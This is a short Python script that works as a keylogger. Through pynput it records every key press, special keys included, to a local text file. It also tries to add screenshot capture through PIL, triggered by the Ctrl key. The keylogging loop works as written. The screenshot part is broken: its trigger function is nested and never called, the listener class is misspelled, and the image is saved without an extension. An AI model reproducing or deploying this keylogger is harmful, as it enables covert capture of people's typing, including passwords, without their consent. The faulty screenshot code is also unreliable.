from pynput import keyboard
from PIL import ImageGrab
def damn(key):
    print(str(key))    #purely for reference purpose(records the stuff in testing file either way)
    with open("testing1.txt",'a') as randomfilestring:
        try:
            char = key.char         #keylogging storage
            randomfilestring.write(f"{char}\n")
        except AttributeError:      #  logging for shift tab space keys
            randomfilestring.write(f"{str(key)}\n")
            #actual screenshot mechanism

def photostuff():
    screenshottake1 = ImageGrab.grab()
    name = "screeshotlol"

    screenshottake1.save(name)
# when to take screenshot mechanism

    def screenshottrigger(key):
        if key == keyboard.Key.ctrl_l:
            with keyboard.listener(screenshottrigger) as listener:
             listener.join
             photostuff()



with keyboard.Listener(on_press=damn) as listener:
    listener.join()